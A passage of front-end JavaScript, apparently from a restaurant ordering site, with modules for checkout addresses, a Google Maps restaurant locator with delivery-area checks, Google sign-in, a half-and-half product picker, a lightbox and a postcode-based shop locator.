    ['address1', 'address2', 'city', 'postal_code'].forEach(function (field) {
    var $field = jElements.formSection.find('#' + field)
        $field.val(lpAddress[field])
    })
  }

  function sendBuyerForm (callback) {
    enableAddressFields()
    callback()
  }

  function afterEdit (callback) {
    if (state.skipMap && (selectedDeliveryMethod() !== 'collection' && selectedDeliveryMethod() !== 'eat_in')) {
      usePrefilledAddress()
    } else if (!state.needEdit || selectedDeliveryMethod() !== 'delivery') {
      callback()
    } else if (state.addressFound) {
      changeState('map')

    } else {
      // Attempt to geocode the address
      var place = getPlaceFromQuery(jElements.geoCoder.val())
      if (place) {
        addressFound(LpAddress.createFromPlace(place))
        changeState('map')
      } else {
        toggleInvalidAddress(true)
      }
    }
  }

  function changeState (stateName) {
    state.machine.changeState(stateName)
  }

  function submitMap () {
    if (jElements.fullAddresses === "true" && !state.lpAddress.address1 || (!state.lpAddress.city && !state.lpAddress.postal_code) || !state.lpAddress.country) {
      changeState('default')
      toggleInvalidAddress(true)
      jElements.errorAddressMessage.show()
    } else {
      changeState('form')
      if(jElements.fullAddresses === "true") {
        disableAddressFields()
      }
    }
  }

  function submitForm () {
    AddressForm.updateAddress(state.lpAddress)
    jElements.geoCoder.val(state.lpAddress.toString())
    state.needEdit = state.skipMap = false
    enableAddressFields()
    changeState('default')
  }

  // Called when a place has just been found
  function addressFound (lpAddress) {
    state.addressFound = jElements.geoCoder.val()
    state.lpAddress = lpAddress
    toggleInvalidAddress(false)
    AddressForm.updateFields(state.lpAddress)
  }

  function getPlaceFromQuery (query) {
    if (!geocoder) {
      geocoder = new Geocoder()
    }
    return geocoder.getPlaceFromQuery(query)
  }

  function selectedDeliveryMethod () {
    var root = $j('[data-checkout-area-form-delivery]')

    return root.find('[data-checkout-area-variant] input:checked[name=delivery_method]').val() ||
        // If there is only one active delivery method
        root.find('[data-checkout-area-variant]').attr('data-checkout-area-variant')
  }

  function toggleDeliveryMethod () {
    var root = $j('[data-checkout-area-form-delivery]'),
        block = root.find('[data-checkout-area-variant=' + selectedDeliveryMethod() + ']')

    block.closest('[data-checkout]')
        .find('[data-checkout-area-variant]>*')
        .not('[data-checkout-area-option]')
        .hide()
    block.find('>*').show()
  }

  function toggleInvalidAddress (isInvalid) {
    state.invalidAddress = isInvalid

    if (isInvalid) {
      jElements.geoCoder.attr('data-geocoder-error', '')
    } else {
      jElements.geoCoder.removeAttr('data-geocoder-error')
    }
  }

  return {
    init: init,
    afterEdit: afterEdit,
    changeState: changeState,
    sendBuyerForm: sendBuyerForm,
    submitMap: submitMap,
    submitForm: submitForm,
    toggleDeliveryMethod: toggleDeliveryMethod
  }
})()
/*****************************
 GoogleLocator

 Autocomplete address field, list & map of restaurants
 Uses by /locator and /restaurants pages
 *****************************/

/* Init options:
    - auto_redirect: redirect to the shop when a single shop matches
    - messages: i18n strings
    - google_api_key
    - instance: instance handle
    - collection_radius: max acceptable distance (in kms) for a collection order. Default: 15
    - default_method: 'delivery' or 'collection'
    - show_list_on_init: if true, show full list on init or when no place is selected. false by default
    - show_all_in_collection: if true, hide address field and show all restaurants in collection. false by default
    - default_redirection: redirect to this path if no 'redirect_to_page' query param is passed. null by default
    - buyer_lp_address: the buyer's saved address
    - overridden_lp_address: the address entered in this session, overrides the buyer's saved address if present

   Elements hierarchy:
    - [data-google-locator=<unique_handle>]: root element, handle is passed as an init() parameter
      - form (must contain a submit button, can also contain a reset button)
        - [data-google-locator-method] (optional)
        - [data-google-locator-address]
        - [data-google-locator-warning]
      - [data-google-locator-map-container]
      - [data-google-locator-restaurants]: list of restaurant details
        - [data-google-locator-restaurant=<shop_id>]: restaurant summary
 */

var GoogleLocator = (function () {
  var state = {},
      model = {},
      jRoot,
      addressField,
      autoRedirect,
      defaultMethod,
      buyerLpAddress,
      overriddenLpAddress,
      collectionRadius,
      googleApiKey,
      googleMap,
      showListOnInit,
      showAllInCollection,
      defaultRedirection,
      isMarketplace,
      messages,
      listShops

  var LOCATION_ZOOM_LEVEL = 14,
      AREA_ZOOM_LEVEL = 11

  // --------------------
  // Helpers
  // --------------------
  function findShopById (id) {
    for (var i = 0; i < model.shops.length; i++) {
      var shop = model.shops[i]
      if (shop.id == id) return shop
    }

    return null
  }

  // Used for delivery
  function doesAreasContain (areas, lpAddress) {
    var latitude = lpAddress.latitude,
        longitude = lpAddress.longitude,
        inAreas = false

    areas.forEach(function (area) {
      var inArea = false,
          vertices = JSON.parse(area)

      if (!vertices) return

      var ptB, ptA = vertices[vertices.length - 1]

      for (var i = 0; i < vertices.length; i++) {
        ptB = ptA
        ptA = vertices[i]
        if ((latitude - ptA['lat']) * (latitude - ptB['lat']) < 0) {
          if (ptA['lng'] + (ptB['lng'] - ptA['lng']) * (latitude - ptA['lat']) / (ptB['lat'] - ptA['lat']) > longitude) {
            inArea = !inArea
          }
        }
      }

      inAreas = inAreas || inArea
    })

    return inAreas
  }

  function doesSectorsContain (sectors, lpAddress) {
    var postalCode = lpAddress.postal_code,
        country = lpAddress.country,
        sector = Postcode.sector(country, postalCode)
    return sectors.includes(sector)
  }

  function findShopsDeliveringAt (lpAddress) {
    return deliveryShops().filter(function (shop) {
      if (shop.areas) {
        var isInArea = doesAreasContain(shop.areas, lpAddress)
        if (isMarketplace && isInArea) {
          computeDistance(shop, lpAddress, false)
        }
        return isInArea
      } else {
        return doesSectorsContain(shop.sectors, lpAddress)
      }
    })
  }

  // Used for collection
  function findShopsNear (lpAddress) {
    var shops = collectionShops().filter(function (shop) {
      computeDistance(shop, lpAddress, true)
      if (shop.distance) {
        return true
      }
    })

    shops.sort(function (a, b) {
      return a.distance - b.distance
    })

    return shops
  }

  function deliveryShops () {
    return model.shops.filter(function (shop) {
      return shop.delivery_methods.includes('delivery')
    })
  }

  function collectionShops () {
    return model.shops.filter(function (shop) {
      return shop.delivery_methods.includes('collection')
    })
  }

  // --------------------
  // Core methods
  // --------------------
  function init (shops, options) {
    autoRedirect = options.auto_redirect !== undefined ? options.auto_redirect : true
    collectionRadius = options.collection_radius || 15
    defaultMethod = options.default_method
    buyerLpAddress = options.buyer_lp_address
    overriddenLpAddress = options.overridden_lp_address
    messages = options.messages
    googleApiKey = options.google_api_key
    showListOnInit = options.show_list_on_init
    showAllInCollection = options.show_all_in_collection || false
    defaultRedirection = options.default_redirection || ''
    isMarketplace = options.is_marketplace
    isSrollToShop = options.scroll_to_shop || false

    if (isMarketplace && document.getElementsByClassName('index-locator__dropdown').length) {
      document.getElementsByClassName('index-locator__dropdown')[0].style.display = 'block'
    }

    if (shops.length == 0) throw('No shop available')

    jRoot = $j('[data-google-locator-instance=' + options.instance + ']')
    model.shops = shops

    jRoot.find('[data-google-locator-method]').prop('checked', false)
    jRoot.find('[data-google-locator-method=' + defaultMethod + ']').prop('checked', true)

    var latitudes = [],
        longitudes = []

    model.shops.forEach(function (shop) {
      latitudes.push(shop.location.lat)
      longitudes.push(shop.location.lng)
    })

    model.mapsLatLngBounds = new google.maps.LatLngBounds(
        new google.maps.LatLng(Math.min.apply(Math, latitudes), Math.min.apply(Math, longitudes)),
        new google.maps.LatLng(Math.max.apply(Math, latitudes), Math.max.apply(Math, longitudes))
    )

    addressField = new google.maps.places.Autocomplete(
        jRoot.find('[data-google-locator-address] input')[0],
        { bounds: model.mapsLatLngBounds }
    )
    addressField.setFields(['address_components', 'geometry'])
    addressField.addListener('place_changed', addressChanged)

    setDefaultAddress()
    computeState()
    refresh()
    if (isSrollToShop && state.listShops.length) {
      window.scrollTo(0, document.getElementsByClassName('marketplace-shops-list')[0].getBoundingClientRect().y);
    }
  }

  /*
   * Calculate matching shops depending on delivery method:
   *  - collection: distance from restaurant < x kms
   *  - delivery: address belongs to restaurant delivery area
   */
  function computeState () {
    state.method = jRoot.find('[data-google-locator-method]:checked').attr('data-google-locator-method') || defaultMethod

    // If entered address is invalid, reset address field and place
    if (state.lpAddress && state.warning) {
      setAddress('')
      state.lpAddress = null
    }
    state.warning = null

    // Reset distances
    model.shops.forEach(function (shop) {
      shop.distance = null
    })

    if (showListOnInit || isMarketplace) {
      state.listShops = model.shops
      state.mapShops = model.shops
    } else {
      state.listShops = []
      state.mapShops = []
    }

    if (state.method === 'delivery') {
      computeStateDelivery()
    } else {
      computeStateCollection()
    }

    if (state.listShops.length === 1 && autoRedirect) {
      // Redirect directly to the shop
      location.href = state.listShops[0].url
    }
  }

  function computeStateDelivery () {
    if (!state.lpAddress) return

    state.listShops = findShopsDeliveringAt(state.lpAddress)
    listShops = state.listShops
    if (isMarketplace && $j('.selected[data-category-shop]').length > 0) {
      state.listShops = state.listShops.filter((shop) => $j('.selected[data-category-shop]').attr('data-category-shop').includes(shop.id))
    }
    if (!state.listShops.length) {
      state.warning = messages.no_delivery_here
    }
  }

  function computeStateCollection () {
    var shops

    if (showAllInCollection) {
      shops = collectionShops()
    } else if (state.lpAddress) {
      shops = findShopsNear(state.lpAddress)
    } else {
      return
    }

    if (shops.length) {
      state.listShops = shops
      state.mapShops = shops

    } else {
      state.warning = messages.no_shop
    }
  }

  /*
   * List: show matching [data-google-locator-restaurant]
   * Map:
   *  - collection, show matching results on [data-google-locator-map-container] and center the map.
   *  - delivery, hide [data-google-locator-map-container]
   */
  function refresh () {
    // Google map
    var mapContainer = jRoot.find('[data-google-locator-map-container]')
    if (state.method == 'delivery' || state.mapShops.length === 0) {
      mapContainer.hide()

    } else if (state.mapShops.length > 0) {
      refreshMap()
      mapContainer.show()
    }

    // Hide address input in collection
    var hideInput = showAllInCollection && state.method == 'collection'
    jRoot.find('[data-google-locator-address]').toggle(!hideInput)

    // Toggle method specific sections
    jRoot.find('[data-google-locator-show-on-delivery]').toggle(state.method == 'delivery')
    jRoot.find('[data-google-locator-hide-on-delivery]').toggle(state.method != 'delivery')
    jRoot.find('[data-google-locator-show-on-collection]').toggle(state.method == 'collection')
    jRoot.find('[data-google-locator-hide-on-collection]').toggle(state.method != 'collection')

    // Warning message
    jRoot.find('[data-google-locator-warning]').html(state.warning).toggle(!!state.warning)

    // Update visibility and distance of each restaurant
    jRoot.find('[data-google-locator-restaurants]').toggle(state.listShops.length > 0)
    jRoot.find('[data-google-locator-restaurant-distance]').html('')
    jRoot.find('[data-google-locator-restaurant]').attr('data-google-locator-restaurant-hidden', '')

    if (state.lpAddress || state.method == 'collection' || isMarketplace) {
      state.listShops.forEach(function (shop) {
        var restaurant = jRoot.find('[data-google-locator-restaurant=' + shop.id + ']')

        restaurant.attr('data-google-locator-restaurant-hidden', null)

        if (shop.distance) {
          var roundedDistance = Math.round(shop.distance * 10) / 10,
              distanceString = roundedDistance >= 2 ? roundedDistance + ' kms' : roundedDistance + ' km'

          restaurant.find('[data-google-locator-restaurant-distance]').html(distanceString)
        }
      })
    }

    // Reorder restaurants by increasing distance
    // This operation is only performed if order changes: this is a costly operation, that causes all Google Maps IFRAMEs to be fetched
    // again.

    // disabled outside of locator and for collection
    if (state.method === 'delivery' && window.location.href.includes('locator')) {
      var visibleRestaurants = jRoot.find('[data-google-locator-restaurant][data-google-locator-restaurant-hidden!=\'\']'),
          currentOrder = visibleRestaurants.toArray().map(function (e) {
            return parseInt($j(e).attr('data-google-locator-restaurant'))
          }),
          newOrder = state.listShops.map(function (shop) {
            return shop.id
          })

      if (JSON.stringify(currentOrder) != JSON.stringify(newOrder)) {
        state.listShops.forEach(function (shop) {
          var restaurant = jRoot.find('[data-google-locator-restaurant=' + shop.id + ']')
          restaurant.appendTo(restaurant.parent())
        })
      }
    }

    // Toggle selected
    jRoot.find('[data-google-locator-restaurants]').attr('data-google-locator-restaurants-selected', (state.selectedShop ? '' : null))
    jRoot.find('[data-google-locator-restaurant]').each(function (i, e) {
      var restaurant = $j(e),
          isSelected = state.selectedShop && restaurant.attr('data-google-locator-restaurant') == state.selectedShop.id
      restaurant.attr('data-google-locator-restaurant-selected', (isSelected ? '' : null))
    })
    
  }

  function refreshMap () {
    var mapContainer = jRoot.find('[data-google-locator-map-container]')[0]
    if (!mapContainer) return

    if (!googleMap) {
      googleMap = new google.maps.Map(jRoot.find('[data-google-locator-map-container]')[0], {
        gestureHandling: 'greedy', // Disable Ctrl + Scroll to zoom
        zoom: 10
      })
    }

    if (state.gotoLocation) {
      googleMap.setCenter(state.gotoLocation)
      googleMap.setZoom(LOCATION_ZOOM_LEVEL)
      state.gotoLocation = null

    } else if (state.lpAddress) {
      googleMap.setCenter(state.place)
      googleMap.setZoom(AREA_ZOOM_LEVEL)

    } else {
      googleMap.setCenter(model.mapsLatLngBounds.getCenter())
      googleMap.fitBounds(model.mapsLatLngBounds)
    }

    state.mapShops.forEach(function (shop) {
      if (shop.marker) return

      shop.marker = new google.maps.Marker({
        map: googleMap,
        position: shop.location,
        title: shop.name
      })

      shop.marker.addListener('click', function () {
        if (shop.restaurant_info) {
          state.restaurantInfo = shop.restaurant_info
          state.selectedShop = shop
          state.gotoLocation = shop.location
          refresh()
        } else {
          location.href = shop.url
        }
      })
    })
  }

  // --------------------
  // Public methods
  // --------------------
  function keyPressed (event) {
    // Enter key should not submit the form
    if (window.event.keyCode === 13) return false

    // Some keys should not trigger a reset
    if ([
      9, // Tab
      16, 17, 18, // Shift, Ctrl, Alt
      27, // Esc
      33, 34, // Page up/down
      35, 36, // Start/end of line
      37, 38, 39, 40, // Cursor
      45, // Insert
      93, // Contextual menu
      225, // Alt Gr
    ].includes(event.keyCode)) {
      return true
    }

    // Reset locator
    state.warning = null
    state.lpAddress = null
    state.gotoLocation = null
    state.selectedShop = null

    if (showListOnInit) {
      state.listShops = model.shops
      state.mapShops = model.shops
    } else {
      state.listShops = []
      state.mapShops = []
    }

    refresh()

    return true
  }

  function computeDistance(shop, lpAddress, isCollection) {
    var latitude = lpAddress.latitude,
        longitude = lpAddress.longitude
    var dNorth = (shop.location.lat - latitude) * Math.PI * 6400 / 180,
        dEast = (shop.location.lng - longitude) * Math.PI * (Math.cos(latitude * Math.PI / 180)) * 6400 / 180,
        distance = Math.sqrt(dNorth * dNorth + dEast * dEast)
    if(!isCollection || (shop.distance && distance < collectionRadius)){
      shop.distance = distance
    }
  }

  function methodChanged () {
    computeState()
    refresh()
  }

  function setAddress (address) {
    jRoot.find('[data-google-locator-address] input').val(address)
  }

  function setDefaultAddress () {
    state.lpAddress = overriddenLpAddress || buyerLpAddress

    if (state.lpAddress) {
      setAddress(state.lpAddress.toString())
      state.gotoLocation = {
        lat: state.lpAddress.latitude,
        lng: state.lpAddress.longitude
      }
    }
  }

  function addressChanged () {
    var place = addressField.getPlace()
    state.lpAddress = place ? LpAddress.createFromPlace(place) : null

    state.warning = null
    state.gotoLocation = place && place.geometry ? place.geometry.location : null
    state.selectedShop = null
    state.addressEdited = true

    computeState()
    refresh()
  }

  function resetAddress () {
    setAddress('')
    addressChanged()
    unselectShop()
  }

  function toggleShop (shopId) {
    if (state.selectedShop && state.selectedShop.id == shopId) {
      unselectShop()
    } else {
      selectShop(shopId)
    }
  }

  function selectShop (shopId) {
    state.selectedShop = findShopById(shopId)

    if (state.selectedShop) {
      state.gotoLocation = state.selectedShop.location
    } else {
      state.gotoLocation = null
    }

    computeState()
    refresh()
  }

  function unselectShop () {
    state.selectedShop = null
    computeState()
    refresh()
  }

  function goToShop (shopId) {
    var shop = findShopById(shopId),
        redirect_to_page = Util.getParameterFromUrl(window.location.href, 'redirect_to_page') || defaultRedirection,
        url = shop.url + '/' + redirect_to_page.replace(/^\//, '')

    url = Util.addKeyValueToURL(url, 'delivery_method', state.method)

    // Only encode sc_overridden_lp_address if the user entered a new address on the locator
    if (state.lpAddress && state.addressEdited) {
      url = Util.addKeyValueToURL(url, 'sc_overridden_address', JSON.stringify(state.lpAddress))
    }

    Util.redirect(url)
  }

  /* Just additional public method to update zoom value of the map with custom value for /restaurants page start screen */
  /* it's mostly like very rare case - it will not affect any of the themes */
  function setCustomZoom (zoomValue) {
    googleMap.setCenter(model.mapsLatLngBounds.getCenter())
    googleMap.setZoom(zoomValue)
  }

  // function refreshListShops (shops) {
  function refreshListShops () {
    if (state.listShops && listShops) {
      if (state.lpAddress) {
        state.listShops = listShops
        refresh()
      } else {
        state.listShops = listShops
      }
    }
  }

  return {
    init: init,
    keyPressed: keyPressed,
    methodChanged: methodChanged,
    addressChanged: addressChanged,
    resetAddress: resetAddress,
    toggleShop: toggleShop,
    selectShop: selectShop,
    unselectShop: unselectShop,
    goToShop: goToShop,
    setCustomZoom: setCustomZoom,
    refreshListShops: refreshListShops
  }
})()
/*****************************
 GoogleLogin

 Handle Google Identity library
 *****************************/

var GoogleLogin = (function () {
  var isInitialized = false;
  var oneTapAvoided = localStorage.getItem('oneTapAvoided') === true;
  var redirectUrl = null;

  const script = document.createElement('script');
  script.src = 'https://accounts.google.com/gsi/client';
  script.async = true;
  script.defer = true;

  document.head.appendChild(script);

  var init = function (redirect_to = window.location.pathname) {
    // Skip init if configuration is the same
    if (isInitialized && redirectUrl === redirect_to) return;
    redirectUrl = redirect_to;
    initGoogleAuth(redirectUrl);
  }

  var renderButton = function (container) {
     renderGoogleSignInButton(container);
  }

  var promptOneTap = function () {
    if (oneTapAvoided) return;
    google.accounts.id.prompt((notification) => {
      if (notification.isSkippedMoment() || notification.isDismissedMoment()) {
        oneTapAvoided = true;
        localStorage.setItem('oneTapAvoided', true);
      }
    });
  }

  var debug = function () {
    console.log('GoogleLogin: isInitialized: ' + isInitialized);
    console.log('GoogleLogin: oneTapAvoided: ' + oneTapAvoided);
    console.log('GoogleLogin: redirectUrl: ' + redirectUrl);
  }

  /******************************
   * Helper functions
   ******************************/

  function handleCredentialResponse(response) {
    console.log("Encoded JWT ID token: " + response.credential);

    let decoded_jwt = JSON.parse(atob(response.credential.split(".")[1]));

    console.log("Decoded JWT ID token: " + decoded_jwt);

    let redirect_to = document.getElementById("google_redirect_to_page")?.value;
    if (redirect_to) submitLoginFormData(response.credential, decoded_jwt.email, decoded_jwt.family_name, decoded_jwt.given_name, decoded_jwt.sub, redirect_to)

    submitLoginFormData(response.credential, decoded_jwt.email, decoded_jwt.family_name, decoded_jwt.given_name, decoded_jwt.sub, redirectUrl)
    localStorage.removeItem('oneTapAvoided');
  }

  function handleCredentialResponseError(error) {
    console.log("Error: " + error);
    localStorage.removeItem('oneTapAvoided');
  }

  function submitLoginFormData(google_id_token, google_email, google_last_name, google_first_name, google_user_id, google_redirect_to_page) {
// Create a new form element
    var form = document.createElement("form");

// Set the attributes of the form element
    form.setAttribute("action", "/buyers/google");
    form.setAttribute("method", "post");
    form.setAttribute("id", "google_login_form");
    form.setAttribute("style", "display: none;");

// Create new input elements and append them to the form
    var id_token = document.createElement("input");
    id_token.setAttribute("type", "hidden");
    id_token.setAttribute("name", "id_token");
    id_token.setAttribute("id", "google_id_token");
    id_token.setAttribute("value", google_id_token);

    var email = document.createElement("input");
    email.setAttribute("type", "hidden");
    email.setAttribute("name", "email");
    email.setAttribute("id", "google_email");
    email.setAttribute("value", google_email);

    var last_name = document.createElement("input");
    last_name.setAttribute("type", "hidden");
    last_name.setAttribute("name", "last_name");
    last_name.setAttribute("id", "google_last_name");
    last_name.setAttribute("value", google_last_name);

    var first_name = document.createElement("input");
    first_name.setAttribute("type", "hidden");
    first_name.setAttribute("name", "first_name");
    first_name.setAttribute("id", "google_first_name");
    first_name.setAttribute("value", google_first_name);

    var user_id = document.createElement("input");
    user_id.setAttribute("type", "hidden");
    user_id.setAttribute("name", "user_id");
    user_id.setAttribute("id", "google_user_id");
    user_id.setAttribute("value", google_user_id);

    var redirect_to_page = document.createElement("input");
    redirect_to_page.setAttribute("type", "hidden");
    redirect_to_page.setAttribute("name", "redirect_to_page");
    redirect_to_page.setAttribute("id", "google_redirect_to_page");
    redirect_to_page.setAttribute("value", google_redirect_to_page);

    form.appendChild(id_token);
    form.appendChild(email);
    form.appendChild(last_name);
    form.appendChild(first_name);
    form.appendChild(user_id);
    form.appendChild(redirect_to_page);

    // Append the form to the document body
    document.body.appendChild(form);
    form.submit();
  }

    function initGoogleAuth(redirect_to) {
      google.accounts.id.initialize({
        client_id: '',
        callback: handleCredentialResponse,
        scope: 'profile email',
        cookiepolicy: 'single_host_origin',
        ux_mode: 'popup',
        redirect_uri: redirect_to,
      });

      isInitialized = true;
    }

    function renderGoogleSignInButton(container = document.getElementById("google-signin-btn")) {
      google.accounts.id.renderButton(
          container,
          {theme: "outline", size: "large", width: container.offsetWidth, text: 'continue_with', onsuccess: handleCredentialResponse, onerror: handleCredentialResponseError} // customization attributes
      );
    }

  return {
    init: init,
    renderButton: renderButton,
    promptOneTap: promptOneTap,
    debug: debug
  }
})()
/*****************************
 HalfHalf
 *****************************/

var HalfHalf = (function () {
  function productSelected (side) {
    var product_handle = side.find('[data-half-half-select] option:selected').val()

    side.find('[data-half-half-name]').hide()
    side.find('[data-half-half-name=' + product_handle + ']').show()

    side.find('[data-half-half-description]').hide()
    side.find('[data-half-half-description=' + product_handle + ']').show()

    side.find('[data-half-half-picture]').hide()
    side.find('[data-half-half-picture=' + product_handle + ']').show()
  }

  var init = function () {
    $j('[data-half-half-select]').change(function () {
      var side = $j(this).closest('[data-side]')
      productSelected(side)
    })

    $j('[data-side]').each(function () {
      productSelected($j(this))
    })
  }

  return {
    init: init
  }
})()
/*******************
 Homepage
 *******************/

// Homepage same height blocks
var height_equalize = function (items) {

  function need_equalization () {
    return ($j(items).css('float') == 'left')
  }

  function equalize_row (elements) {
    var max = 0
    $j(elements).css('height', '')
    if (need_equalization()) {
      elements.each(function () {
        if ($j(this).height() > max) {
          max = $j(this).height()
        }
      })
      elements.height(max)
    }
  }

  function equalize () {
    equalize_row($j(items))
  }

  function init () {
    $j(window).on('load resize', equalize)
    equalize()
  }

  return {
    init: init
  }
}
// --------------------
// Touch lightbox
// --------------------
/*
  Default lightbox width = 350px
  
  initial call:
  touchLightbox.init()
  
  activates lighbox and adds the object to it:
  touchLightbox.open(elem,new-width)
  touchLightbox.open(elem) = no width, uses default width value
  
  Close button closes lightbox and destroys the object added to lightbox
*/

var touchLightbox = (function () {
  var lightbox,
      overlay,
      content,
      btn_close,
      node,
      open_class,
      open_class_overlay,
      is_active

  var open = function (new_node,width) {
    if(is_active) return

    if(width) setWidth(width)

    node = new_node
    content.append(node)

    lightbox.addClass(open_class)
    overlay.addClass(open_class_overlay)
    is_active = true
  }

  var close = function () {
    if(!is_active) return

    lightbox.removeClass(open_class)
    overlay.removeClass(open_class_overlay)

    node.remove()

    is_active = false
  }

  var setWidth = function (w) {
    lightbox.css("width",w)
  }

  
  var init = function () {
    lightbox = $j("#page-lightbox")
    content = $j("#page-lightbox-content")
    overlay = $j("#page-lightbox-overlay")
    btn_close = $j("#page-lightbox-close")
    open_class = "page-lightbox_open"
    open_class_overlay = "page-lightbox-overlay_open"
    is_active = false

    // set default lightbox width: 350px
    setWidth(350)

    // close button
    btn_close.on("click", function () {
      close()
      return false
    })

  }

  return {
    init: init,
    open: open
  }

})()
/*****************************
 Locator
 *****************************/

var Locator = (function () {
  // --------------
  // Variables
  // --------------
  // 'delivery', 'collection' or 'eat_in'
  var method

  // The entered postcode
  var postcode

  // The entered street
  var street

  // The shop ids matching the entered postcode/street.
  var shop_ids

  // The streets of the selected postcode
  // street name -> [shop_ids]
  var postcode_streets

  // Show postcode/street warning?
  var show_postcode_warning = false
  var show_street_warning = false

  // Are we currently being redirected?
  var redirected = false

  // --------------
  // Settings
  // --------------
  // The default page the user is redirected on
  var default_redirect_to_page = '/categories'

  // Used for postcode normalization
  var country

  // Default method (delivery/collection)
  var default_method = 'delivery'

  // In delivery mode, automatically redirect the user to the shop when a valid postcode was entered and it
  // matches exactly one one restaurant.
  var delivery_autoredirect

  // Show the postcode field in collection?
  var postcode_in_collection

  // Does the user have to enter the street name?
  var use_streets

  // shop id -> URL
  var shop_urls

  // postal code and city -> { ajax_street_url: URL, shop_ids: [shop_ids] } (postal code/city of the delivery zones)
  var delivery_postal_codes

  // postal code and city -> [shop_ids] (postal code/city of the shops)
  var collection_postal_codes

  // Show the postcode and streets autocomplete popup
  var use_autocomplete

  // Display method for the select options
  var displayed_postal_code = function (postal_code, city) {
    return postal_code + ' - ' + city
  }

  // --------------
  // Initialization
  // --------------
  var checkInit = function () {
    if (shop_urls == undefined) {
      console.error('Locator.setRestaurantUrls must be called before init')
      return false
    }
    if (delivery_postal_codes == undefined) {
      console.error('Locator.setDeliveryPostalCodes must be called before init')
      return false
    }
    if (collection_postal_codes == undefined) {
      console.error('Locator.setCollectionPostalCodes must be called before init')
      return false
    }
    return true
  }

  var initHandlers = function () {
    $j('[data-locator-method]').click(function () {
      methodSelected()
    })

    $j('[data-locator-postcode-input],[data-locator-street-input]').on('keypress focus', function () {
      $j(this).removeAttr('data-locator-error')
    })

    $j('[data-locator-postcode-input]').keypress(function (e) {
      if (e.keyCode == 13) {
        e.preventDefault()
        postcodeSelected()
        if (use_autocomplete) $j(this).autocomplete('close')
      }
    })

    $j('[data-locator-street-input]').keypress(function (e) {
      if (e.keyCode == 13) {
        e.preventDefault()
        streetSelected()
        if (use_autocomplete) $j(this).autocomplete('close')
      }
    })
  }

  // --------------
  // Helpers
  // --------------
  var sectorFromKey = function (key) {
    return key.split('$$$')[0]
  }

  var cityFromKey = function (key) {
    return key.split('$$$')[1]
  }

  function allShopIds () {
    var all_shop_ids = []
    $j.each(collection_postal_codes, function (postal_code, postal_code_map) {
      var _shop_ids = postal_code_map['shop_ids']
      $j.each(_shop_ids, function (i, _shop_id) {
        if (all_shop_ids.indexOf(_shop_id) == -1) all_shop_ids.push(_shop_id)
      })
    })
    return all_shop_ids
  }

  var postcodeAutocomplete = function () {
    $j('[data-locator-postcode-input]').autocomplete({
      source: $j.map(
          method == 'delivery' ? delivery_postal_codes : collection_postal_codes,
          function (value, key) {
            return displayed_postal_code(sectorFromKey(key), cityFromKey(key))
          }
      ),
      select: function (event, ui) {
        $j(this).val(ui.item.value)
        postcodeSelected()
      }
    })
  }

  var streetAutocomplete = function () {
    $j('[data-locator-street-input]').autocomplete({
      source: $j.map(
          postcode_streets,
          function (value, key) {
            return key
          }
      ),
      select: function (event, ui) {
        $j(this).val(ui.item.value)
        streetSelected()
      }
    })
  }

  var redirectToShop = function (shop_id) {
    var redirect_to_page = Util.getParameterFromUrl(window.location.href, 'redirect_to_page') || default_redirect_to_page
    var url = shop_urls[shop_id] + redirect_to_page,
        url_with_method = Util.addKeyValueToURL(url, 'delivery_method', method)

    Util.redirect(url_with_method)

    redirected = true // Prevent refreshDisplay to hide/show new items while we are being redirected
  }

  var deliveryAutoredirect = function () {
    if (delivery_autoredirect && method == 'delivery' && shop_ids && shop_ids.length == 1) {
      redirectToShop(shop_ids[0])
    }
  }

  // --------------
  // Events
  // --------------
  var methodSelected = function () {
    setMethodFromInput()
    if (use_autocomplete) postcodeAutocomplete()

    Locator.resetPostcode()
  }

  var postcodeSelected = function () {
    setPostcodeFromInput()
    if (use_autocomplete) streetAutocomplete()

    Locator.resetStreet()
  }

  var streetSelected = function () {
    setStreetFromInput()
    refreshDisplay()
  }

  var setMethodFromInput = function () {
    method = $j('input[data-locator-method]:checked').attr('data-locator-method') || default_method
  }

  var setPostcodeFromInput = function () {
    postcode = undefined
    postcode_streets = undefined
    shop_ids = undefined
    show_postcode_warning = false

    if (!(method == 'delivery' || postcode_in_collection)) {
      shop_ids = allShopIds()
      return
    }

    var _postcode = $j('[data-locator-postcode-input]').val() || Util.getParameterFromUrl(window.location.href, 'postcode')
    if (!_postcode) {
      return
    }

    var postal_codes = (method == 'delivery' ? delivery_postal_codes : collection_postal_codes),
        sector = Postcode.sector(country, _postcode),
        selected_keys = $j.grep(Object.keys(postal_codes), function (key, i) {
          var currentSector = sectorFromKey(key)
          var currentCity = cityFromKey(key)

          if (displayed_postal_code(currentSector, currentCity) == _postcode)
            return true;
          else
            return currentSector == sector;
        })

    if (!selected_keys) {
      show_postcode_warning = true
      return
    }

    postcode = Postcode.normalize(country, _postcode)

    if (use_streets && !Array.isArray(selected_keys) && postal_codes[selected_keys]['ajax_street_url']) {
      $j.ajax({
        url: postal_codes[selected_keys]['ajax_street_url'],
        async: false,
        dataType: 'json',
        success: function (data) {
          postcode_streets = data
        }
      })
    } else {
      if (Array.isArray(selected_keys)) {
        shop_ids = []
        selected_keys.forEach((key) => {
          shop_ids = shop_ids.concat(postal_codes[key]['shop_ids'])
        })
      } else {
        shop_ids = postal_codes[selected_keys]['shop_ids']
      }
    }

    deliveryAutoredirect()
  }

  var setStreetFromInput = function () {
    street = undefined
    show_street_warning = false

    if (!postcode_streets) {
      return
    }

    shop_ids = undefined

    var _street = $j('[data-locator-street-input]').val()
    if (!_street) {
      return
    }

    shop_ids = postcode_streets[_street]
    if (!shop_ids) {
      show_street_warning = true
      return
    }

    deliveryAutoredirect()

    street = _street
  }

  // --------------
  // Display
  // --------------
  var refreshDisplay = function () {
    if (redirected) return

    // Toggle elements
    var show_postcode_form = !postcode && !shop_ids
    $j('[data-locator-postcode-form]').toggle(show_postcode_form)
    if (show_postcode_form) $j('[data-locator-postcode-input]').focus()

    var show_street_form = !!postcode_streets && !shop_ids
    $j('[data-locator-street-form]').toggle(show_street_form)
    if (show_street_form) $j('[data-locator-street-input]').focus()

    $j('[data-locator-show-on-postcode]').toggle(!!postcode)
    $j('[data-locator-show-on-street]').toggle(!!street)
    $j('[data-locator-show-on-selected]').toggle(!!shop_ids)

    $j('[data-locator-show-on-delivery]').toggle(method == 'delivery')
    $j('[data-locator-hide-on-delivery]').toggle(method != 'delivery')
    $j('[data-locator-show-on-collection]').toggle(method == 'collection')
    $j('[data-locator-hide-on-collection]').toggle(method != 'collection')

    $j('[data-locator-show-on-delivery-warning]').toggle(show_postcode_warning && method == 'delivery')
